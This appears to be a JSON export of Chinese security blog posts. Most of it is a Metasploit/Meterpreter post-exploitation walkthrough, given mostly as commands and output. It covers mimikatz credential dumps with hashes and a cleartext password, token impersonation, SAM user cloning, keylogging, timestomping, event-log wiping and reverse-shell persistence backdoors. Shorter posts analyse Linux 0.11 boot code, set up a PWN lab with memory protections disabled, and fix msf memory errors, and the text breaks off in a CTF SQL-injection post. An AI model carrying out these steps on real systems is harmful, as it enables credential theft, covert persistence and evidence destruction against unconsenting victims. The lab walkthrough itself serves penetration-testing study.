Meterpreter session 2 opened (192.168.161.138:4444 -&gt; 192.168.161.132:49959) at 2018-03-19 16:56:51 +0800meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 0x02 域管理员嗅探123456789101112131415161718192021msf exploit(multi/handler) &gt; use post/windows/gather/enum_domainmsf post(windows/gather/enum_domain) &gt; show options Module options (post/windows/gather/enum_domain): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.msf post(windows/gather/enum_domain) &gt; set session 1session =&gt; 1msf post(windows/gather/enum_domain) &gt; exploit[+] FOUND Domain: test[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)[*] Post module execution completedmsf post(windows/gather/enum_domain) &gt; exploit[+] FOUND Domain: test[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)[*] Post module execution completed 0x03抓取密码1234567891011121314151617181920212223242526272829303132meterpreter &gt; load mimikatz Loading extension mimikatz...Success.meterpreter &gt; help...Mimikatz Commands================= Command Description ------- ----------- kerberos Attempt to retrieve kerberos creds livessp Attempt to retrieve livessp creds mimikatz_command Run a custom command msv Attempt to retrieve msv creds (hashes) ssp Attempt to retrieve ssp creds tspkg Attempt to retrieve tspkg creds wdigest Attempt to retrieve wdigest credsmeterpreter &gt; wdigest [!] Not currently running as SYSTEM[*] Attempting to getprivs[+] Got SeDebugPrivilege[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;49485 NTLM 0;293672 Kerberos TEST Administrator TopSec_20170;996 Negotiate TEST TOPSEC$ ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c 0;999 Negotiate TEST TOPSEC$ ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c 或者123456789101112131415161718msf post(windows/gather/hashdump) &gt; exploit[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 2739ba60d0407daf0d866cb3ee4b6b9f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:f013ff76154a124f8cfc32f654582420:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[*] Post module execution completed 0x04假冒令牌空格和斜杠注意转译 12345678910111213141516171819202122232425262728293031323334353637383940414243444546meterpreter &gt; use incognitoLoading extension incognito...Success.meterpreter &gt; help...Incognito Commands================== Command Description ------- ----------- add_group_user Attempt to add a user to a global group with all tokens add_localgroup_user Attempt to add a user to a local group with all tokens add_user Attempt to add a user with all tokens impersonate_token Impersonate specified token list_tokens List tokens available under current user context snarf_hashes Snarf challenge/response hashes for every tokenmeterpreter &gt; list_tokens Usage: list_tokens &lt;list_order_option&gt;Lists all accessible tokens and their privilege levelOPTIONS: -g List tokens by unique groupname -u List tokens by unique usernamemeterpreter &gt; list_tokens -uDelegation Tokens Available========================================NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEMTEST\\AdministratorImpersonation Tokens Available========================================NT AUTHORITY\\ANONYMOUS LOGONmeterpreter &gt; impersonate_token NT AUTHORITY\\\\SYSTEM[-] User token NT not foundmeterpreter &gt; impersonate_token NT\\ AUTHORITY\\\\SYSTEM[+] Delegation token available[+] Successfully impersonated user NT AUTHORITY\\SYSTEMmeterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 0X05注册表操作1234567891011121314151617181920212223meterpreter &gt; reg -hUsage: reg [command] [options]Interact with the target machine&apos;s registry.OPTIONS: -d &lt;opt&gt; The data to store in the registry value. -h Help menu. -k &lt;opt&gt; The registry key path (E.g. HKLM\\Software\\Foo). -r &lt;opt&gt; The remote machine name to connect to (with current process credentials -t &lt;opt&gt; The registry value type (E.g. REG_SZ). -v &lt;opt&gt; The registry value name (E.g. Stuff). -w Set KEY_WOW64 flag, valid values [32|64].COMMANDS: enumkey Enumerate the supplied registry key [-k &lt;key&gt;] createkey Create the supplied registry key [-k &lt;key&gt;] deletekey Delete the supplied registry key [-k &lt;key&gt;] queryclass Queries the class of the supplied key [-k &lt;key&gt;] setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;] deleteval Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;] queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;] 下面演示通过注册表设置开机自启动 12345678910111213141516171819202122meterpreter &gt; reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runEnumerating: HKLM\\software\\microsoft\\windows\\currentversion\\run Values (1): VMware User Processmeterpreter &gt; reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v note -d &apos;C:\\Windows\\System32\\notepad.exe&apos;Successfully set note of REG_SZ.meterpreter &gt; reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runEnumerating: HKLM\\software\\microsoft\\windows\\currentversion\\run Values (2): VMware User Process notemeterpreter &gt; reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v note Key: HKLM\\software\\microsoft\\windows\\currentversion\\runName: noteType: REG_SZData: C:\\Windows\\System32\\notepad.exe 下面演示怎么通过注册表复制克隆用户 123456789101112131415161718192021222324252627meterpreter &gt; reg enumkey -k HKLM\\\\sam\\\\sam\\\\domains\\\\account\\\\usersEnumerating: HKLM\\sam\\sam\\domains\\account\\users Keys (3): 000001F4 000001F5 Names Values (1): meterpreter &gt; shellProcess 1884 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\\windows\\system32&gt;net user guest /active:yes net user guest /active:yesC:\\windows\\system32&gt;reg copy HkLM\\sam\\sam\\domains\\account\\users\\000001f4 HkLM\\sam\\sam\\domains\\account\\users\\000001f5reg copy HkLM\\sam\\sam\\domains\\account\\users\\000001f4 HkLM\\sam\\sam\\domains\\account\\users\\000001f5 sam\\sam\\domains\\account\\users\\000001f4\\F �Ѵ��ڣ�Ҫ������(Yes/No/All)? Yes\\ֵ sam\\sam\\domains\\account\\users\\000001f4\\V �Ѵ��ڣ�Ҫ������(Yes/No/All)?No �����ɹ����ɡ� 0x06端口转发1234567891011121314meterpreter &gt; portfwd delete -l 3389[*] Successfully stopped TCP relay on 0.0.0.0:3389meterpreter &gt; portfwd add -l 3389 -p 3389 -r 192.168.161.138[*] Local TCP relay created: :3389 &lt;-&gt; 192.168.161.138:3389meterpreter &gt; portfwd listActive Port Forwards==================== Index Local Remote Direction ----- ----- ------ --------- 1 0.0.0.0:3389 192.168.161.138:3389 Forward1 total active port forwards. 0x07搜索文件在awd攻防赛的时候很好用12345meterpreter &gt; search -f *flag*Found 3 results... c:\\flag.txt (39 bytes) c:\\Users\\administrator.TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.txt.lnk (477 bytes) c:\\Users\\Administrator.ZGC-20160413JJL\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.txt.lnk (477 bytes) 0x08抓包1234567891011121314151617181920212223242526272829303132333435363738meterpreter &gt; use snifferLoading extension sniffer...Success.meterpreter &gt; helpSniffer Commands================ Command Description ------- ----------- sniffer_dump Retrieve captured packet data to PCAP file sniffer_interfaces Enumerate all sniffable network interfaces sniffer_release Free captured packets on a specific interface instead of downloading them sniffer_start Start packet capture on a specific interface sniffer_stats View statistics of an active capture sniffer_stop Stop packet capture on a specific interfacemeterpreter &gt; sniffer_interfaces1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )4 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )5 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )meterpreter &gt; sniffer_start 5[*] Capture started on interface 5 (50000 packet buffer)meterpreter &gt; sniffer_dump 5 /tmp/1.pcap[*] Flushing packet capture buffer for interface 5...[*] Flushed 2540 packets (1450560 bytes)[*] Downloaded 036% (524288/1450560)...[*] Downloaded 072% (1048576/1450560)...[*] Downloaded 100% (1450560/1450560)...[*] Download completed, converting to PCAP...[*] PCAP file written to /tmp/1.pcapmeterpreter &gt; sniffer_stop 5[*] Capture stopped on interface 5[*] There are 29 packets (2263 bytes) remaining[*] Download or release them using &apos;sniffer_dump&apos; or &apos;sniffer_release&apos; 0x09开启338912345678910meterpreter &gt; run getgui -u haha -p password[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.[!] Example: run post/windows/manage/enable_rdp OPTION=value [...][*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator[*] Carlos Perez carlos_perez@darkoperator.com[*] Setting user account for logon[*] Adding User: haha with Password: password[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rcmeterpreter &gt; run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc 会新建个账号，并在后面删掉 0x0A改变文件时间123456789101112131415161718192021222324252627282930313233343536Usage: timestomp &lt;file(s)&gt; OPTIONSOPTIONS: -a &lt;opt&gt; Set the &quot;last accessed&quot; time of the file -b Set the MACE timestamps so that EnCase shows blanks -c &lt;opt&gt; Set the &quot;creation&quot; time of the file -e &lt;opt&gt; Set the &quot;mft entry modified&quot; time of the file -f &lt;opt&gt; Set the MACE of attributes equal to the supplied file -h Help banner -m &lt;opt&gt; Set the &quot;last written&quot; time of the file -r Set the MACE timestamps recursively on a directory -v Display the UTC MACE values of the file -z &lt;opt&gt; Set all four attributes (MACE) of the filemeterpreter &gt; timestomp -v flag.txt[*] Showing MACE attributes for flag.txtModified : 2017-02-22 14:55:50 +0800Accessed : 2017-01-11 20:53:57 +0800Created : 2017-01-11 20:53:57 +0800Entry Modified: 2017-02-22 14:55:50 +0800meterpreter &gt; timestomp -v 1.txt[*] Showing MACE attributes for 1.txtModified : 2018-03-19 20:13:36 +0800Accessed : 2018-03-19 21:41:24 +0800Created : 2018-03-19 21:41:24 +0800Entry Modified: 2018-03-19 21:41:24 +0800meterpreter &gt; timestomp 1.txt -f flag.txt[*] Pulling MACE attributes from flag.txt[*] Setting specific MACE attributes on 1.txtmeterpreter &gt; timestomp -v 1.txt[*] Showing MACE attributes for 1.txtModified : 2017-02-22 14:55:50 +0800Accessed : 2017-01-11 20:53:57 +0800Created : 2017-01-11 20:53:57 +0800Entry Modified: 2017-02-22 14:55:50 +0800 0x0B日志清除1234meterpreter &gt; clearev [*] Wiping 1692 records from Application...[*] Wiping 6855 records from System...[*] Wiping 2664 records from Security... 0X0C留后门 Metsvc(通过服务安装) 12345678910111213meterpreter &gt; run metsvc [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Creating a meterpreter service on port 31337[*] Creating a temporary installation directory C:\\Users\\ADMINI~1.TES\\AppData\\Local\\Temp\\ENDPAzIy...[*] &gt;&gt; Uploading metsrv.x86.dll...[*] &gt;&gt; Uploading metsvc-server.exe...[*] &gt;&gt; Uploading metsvc.exe...[*] Starting the service... * Installing service metsvc * Starting serviceService metsvc successfully installed. 这个时候我们去连接它 1234567891011msf exploit(multi/handler) &gt; set payload windows/metsvc_bind_tcppayload =&gt; windows/metsvc_bind_tcpmsf exploit(multi/handler) &gt; set rhost 192.168.161.132rhost =&gt; 192.168.161.132msf exploit(multi/handler) &gt; set lport 31337lport =&gt; 31337msf exploit(multi/handler) &gt; exploit[*] Started bind handler[*] 192.168.161.132 - Meterpreter session 6 closed. Reason: Died[*] Meterpreter session 6 opened (127.0.0.1 -&gt; 127.0.0.1) at 2018-03-19 21:37:23 +0800 persistence(通过自启动安装) 12345678910111213meterpreter &gt; run persistence -U -i 5 -p 443 -r 192.168.161.138[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/TOPSEC_20180319.1312/TOPSEC_20180319.1312.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.161.138 LPORT=443[*] Persistent agent script is 99606 bytes long[+] Persistent Script written to C:\\Users\\ADMINI~1.TES\\AppData\\Local\\Temp\\xdoxmsHr.vbs[*] Executing script C:\\Users\\ADMINI~1.TES\\AppData\\Local\\Temp\\xdoxmsHr.vbs[+] Agent executed with PID 3528[*] Installing into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\jQiyGnPRxgnllmr[+] Installed into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\jQiyGnPRxgnllmr 然后重启试下123456789101112131415161718meterpreter &gt; [*] 192.168.161.132 - Meterpreter session 4 closed. Reason: Diedmsf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.161.132[*] Meterpreter session 5 opened (192.168.161.138:443 -&gt; 192.168.161.132:49169) at 2018-03-19 21:18:07 +0800msf exploit(multi/handler) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 5 meterpreter x86/windows TEST\\Administrator @ TOPSEC 192.168.161.138:443 -&gt; 192.168.161.132:49169 (192.168.161.132)msf exploit(multi/handler) &gt; sessions -i 5[*] Starting interaction with 5...meterpreter &gt; 会留一个后门，并添加进启动项 0X0D键盘记录12345678meterpreter &gt; keyscan_startStarting the keystroke sniffer ...meterpreter &gt; keyscan_dump Dumping captured keystrokes...mima&lt;Shift&gt;&lt;Right Shift&gt;:12345679&lt;^S&gt;meterpreter &gt; keyscan_stopStopping the keystroke sniffer... 0X0E进程注入1234567891011121314151617181920meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 232 4 smss.exe x86 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 320 312 csrss.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\csrss.exe 368 480 msdtc.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\windows\\System32\\msdtc.exe 372 312 wininit.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\wininit.exe 384 364 csrss.exe x86 1 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\csrss.exe 432 364 winlogon.exe x86 1 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\winlogon.exe 480 372 services.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\services.exe 488 372 lsass.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\lsass.exe...meterpreter &gt; migrate 3104[*] Migrating to 3104 0x0F 截屏123456eterpreter &gt; use espiaLoading extension espia...Success.meterpreter &gt; screenscreengrab screenshot meterpreter &gt; screengrab Screenshot saved to: /home/daiker/zQBKZbTv.jpeg","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"工具使用","slug":"渗透测试/工具使用","permalink":"http://www.daikersec.com/categories/渗透测试/工具使用/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"Kali","slug":"Kali","permalink":"http://www.daikersec.com/tags/Kali/"},{"name":"tools","slug":"tools","permalink":"http://www.daikersec.com/tags/tools/"}]},{"title":"Linuxv0.11源码分析之引导启动程序一","slug":"Linuxv0.11源码分析之引导启动程序一","date":"2018-03-19T05:16:28.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/b309a0f3.html","link":"","permalink":"http://www.daikersec.com/wiki/b309a0f3.html","excerpt":"0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s","text":"0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s 0x01 bios做了什么按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下12340x00000-0x003FF 中断向量表(1kb)0x00400-0x004FF BIOS数据区(256b)....57kb以后-xxxx(8kb)的终端服务程序 接下来bios会触发0x19中断这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存0x07C00处 0x02 将随后的4个扇区加载进内存从入口开始看boot/bootsect.s1234567891011entry _start_start: mov ax,#BOOTSEG mov ds,ax mov ax,#INITSEG mov es,ax mov cx,#256 sub si,si sub di,di rep movw !bootsec 这段代码是含义是将BOOTSEG后面512个字节移到INITSEG后面的512个字节然后看下BOOTSEG和INITSEG的定义12BOOTSEG = 0x07c0 ! 启动扇区被BIOS加载的位置INITSEG = 0x9000 ! 启动扇区将移动到的新位置 也就是说我们在前一步通过bios加载进内存的512字节，一开始会先把自己512字节内容由0x07c00复制到0x90000处接下来1jmpi go,INITSEG !跳转到0x90000处继续执行 这里jmpi的格式是jmpi ip,cs。如果没有这一步，程序接下来会执行0x07C00为开始的那一段的go处。但是这里跳转到0x90000开始的那一段内存的go处。跳转到复制完的地方执行。接下来继续看123456go: mov ax,cs mov ds,ax mov es,ax ! put stack at 0x9ff00. mov ss,ax mov sp,#0xFF00 ! arbitrary value &gt;&gt;512 前面已经改变了cs，现在对ds，es，sp的值进行设置继续看123456load_setup: mov dx,#0x0000 ! drive 0, head 0 mov cx,#0x0002 ! sector 2, track 0 mov bx,#0x0200 ! address = 512, in INITSEG mov ax,#0x0200+SETUPLEN ! service 2, nr of sectors int 0x13 ! read it 首先查下bios的0x13中断是什么意思对应表格查阅，可以看出这几行代码的意思是把从第二个扇区开始的4个扇区(即setup.s，在boot/setup.s里面)读进内存es:bx处，即0x90200处。前面说到第一个扇区的内存被复制到0x90000处，0x90200离0x90000有256字节，刚好是第一个扇区的长度。也就是说第一个扇区和第二个扇区相邻。 12345jnc ok_load_setup ! ok - continue mov dx,#0x0000 mov ax,#0x0000 ! reset the diskette int 0x13 j load_setup 这段代码是判断是否成功，没有成功的话，系统复位之后再重新读一次。 0x03 将后面的240个扇区加载进内存接下来我们将第三批程序载入内存从105行开始1234567! ok, we&apos;ve written the message, now! we want to load the system (at 0x10000) mov ax,#SYSSEG mov es,ax ! segment of 0x010000 call read_it call kill_motor 这段代码的功能和载入setup.s一样，，只不过载入setup.s只有四个扇区，这段代码足足占了240个扇区。花的时间比较长，为了防止用户以为机器故障，linus加了一个输出 123456789mov ah,#0x03 ! read cursor posxor bh,bhint 0x10mov cx,#24mov bx,#0x0007 ! page 0, attribute 7 (normal)mov bp,#msg1mov ax,#0x1301 ! write string, move cursorint 0x10 调用0x10中断输出Loading system ...看下0x10中断的内容 下面我们来具体看下这240个扇区怎么载入的 我们先看下read_it子模块 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576read_it: mov ax,es test ax,#0x0fffdie: jne die ! 确保es必须是64kb xor bx,bx !清空bx,使得bs可以被用作段内基址rp_read: mov ax,es cmp ax,#ENDSEG ! have we loaded all yet? jb ok1_read retok1_read: seg cs mov ax,sectors sub ax,sread mov cx,ax shl cx,#9 add cx,bx jnc ok2_read je ok2_read xor ax,ax sub ax,bx shr ax,#9ok2_read: call read_track mov cx,ax add ax,sread seg cs cmp ax,sectors jne ok3_read mov ax,#1 sub ax,head jne ok4_read inc trackok4_read: mov head,ax xor ax,axok3_read: mov sread,ax shl cx,#9 add bx,cx jnc rp_read mov ax,es add ax,#0x1000 mov es,ax xor bx,bx jmp rp_readread_track: push ax push bx push cx push dx mov dx,track mov cx,sread inc cx mov ch,dl mov dx,head mov dh,dl mov dl,#0 and dx,#0x0100 mov ah,#2 int 0x13 jc bad_rt pop dx pop cx pop bx pop ax retbad_rt: mov ax,#0 mov dx,#0 int 0x13 pop dx pop cx pop bx pop ax jmp read_track 接下来看kill_motor子模块 1234567kill_motor: push dx mov dx,#0x3f2 mov al,#0 outb pop dx ret 0x04 确认下根设备号0x05 将程序控制权转交给setup.s1SETUPSEG = 0x9020 12345! after that (everyting loaded), we jump to! the setup-routine loaded directly after! the bootblock: jmpi 0,SETUPSEG 前面说到0x13中断将第二个扇区到第五个扇区的内容(即setup.s的内容)加载到以0x90200处地址，现在跳转到那边，把控制权交给他","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"内核","slug":"Linux/内核","permalink":"http://www.daikersec.com/categories/Linux/内核/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://www.daikersec.com/tags/内核/"}]},{"title":"PWN环境搭建","slug":"PWN环境搭建","date":"2018-03-18T07:02:16.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/11af4bf6.html","link":"","permalink":"http://www.daikersec.com/wiki/11af4bf6.html","excerpt":"0x00 关闭安全机制1.关掉DEP/NX（堆栈不可执行）1gcc -z execstack -o pwnme pwnme.c 2.关掉Stack Protector/Canary（栈保护）1gcc -fno-stack-protector -o pwnme pwnme.c","text":"0x00 关闭安全机制1.关掉DEP/NX（堆栈不可执行）1gcc -z execstack -o pwnme pwnme.c 2.关掉Stack Protector/Canary（栈保护）1gcc -fno-stack-protector -o pwnme pwnme.c 3.关掉程序ASLR/PIE（程序随机化保护）1gcc -no-pie -o pwnme pwnme.c 4.关闭整个linux系统的ASLR保护123su - echo 0 &gt; /proc/sys/kernel/randomize_va_spaceexit 5.打开整个linux系统的ASLR保护123su -echo 2 &gt; /proc/sys/kernel/randomize_va_spaceexit 64位linux下面的GCC编译出一个32位可执行程序 加参数- m321gcc -m32 -z execstack -fno-stack-protector -o pwnme pwnme.c 另外说明下在ubuntu上如果要用 -m32 参数就要安装如下的库：12$ sudo apt-get install build-essential module-assistant $ sudo apt-get install gcc-multilib g++-multilib 0x01 安装pwntools1pip install pwntools 0x02 安装peda12git clone https://github.com/longld/peda.git ~/pedaecho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit 0x03 绑定端口1socat tcp-l:端口号，reuseaddr，fork exec:程序位置","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://www.daikersec.com/categories/漏洞挖掘/"},{"name":"二进制漏洞","slug":"漏洞挖掘/二进制漏洞","permalink":"http://www.daikersec.com/categories/漏洞挖掘/二进制漏洞/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://www.daikersec.com/tags/pwn/"}]},{"title":"解决msf内存不足不能启动的问题","slug":"解决msf内存不足不能启动的问题","date":"2018-03-15T06:50:54.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/376537a6.html","link":"","permalink":"http://www.daikersec.com/wiki/376537a6.html","excerpt":"0x00 问题在vps里面跑msf，经常遇到内存不足，提示如下","text":"0x00 问题在vps里面跑msf，经常遇到内存不足，提示如下12345678910111213/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;: Cannot allocate memory - infocmp (Errno::ENOMEM) from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:375:in `get_input_line&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:191:in `run&apos; from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start&apos; from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start&apos; 内存不足，一直没有好的解决方案。最近看Linux的时候，看到Swap分区，想到一个解决方案 0x01 解决方案vps默认安装的时候是没有安装swap分区的123456[root@daiker ~]# toptop - 06:35:36 up 14:57, 2 users, load average: 0.21, 0.09, 0.07Tasks: 86 total, 1 running, 85 sleeping, 0 stopped, 0 zombie%Cpu(s): 0.5 us, 0.0 sy, 0.0 ni, 99.5 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 1016108 total, 240924 free, 518952 used, 256232 buff/cacheKiB Swap: 0 total, 0 free, 0 used. 247996 avail Mem 我们可以给分配一个swap分区,命令如下 123dd if=/dev/zero of=/home/swap bs=1024 count=512000/sbin/mkswap /home/swap/sbin/swapon /home/swap 然后查看swap分区1234[root@daiker ~]# free -h total used free shared buff/cache availableMem: 992M 506M 74M 92M 411M 242MSwap: 499M 0B 499M msf成功开启","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"工具使用","slug":"渗透测试/工具使用","permalink":"http://www.daikersec.com/categories/渗透测试/工具使用/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"Kali","slug":"Kali","permalink":"http://www.daikersec.com/tags/Kali/"},{"name":"tools","slug":"tools","permalink":"http://www.daikersec.com/tags/tools/"}]},{"title":"CTF中SQL注入字段名被过滤小技巧","slug":"CTF中SQL注入字段名被过滤小技巧","date":"2018-03-12T03:04:07.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/a62e54a0.html","link":"","permalink":"http://www.daikersec.com/wiki/a62e54a0.html","excerpt":"0x00 前言CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来 0x01 问题引入1234567mysql&gt; select * from users;+--------+-----------+| points | flag |+--------+-----------+| 31 | daiker666 |+--------+-----------+1 row in set (0.00 sec) 然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。","text":"0x00 前言CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来 0x01 问题引入1234567mysql&gt; select * 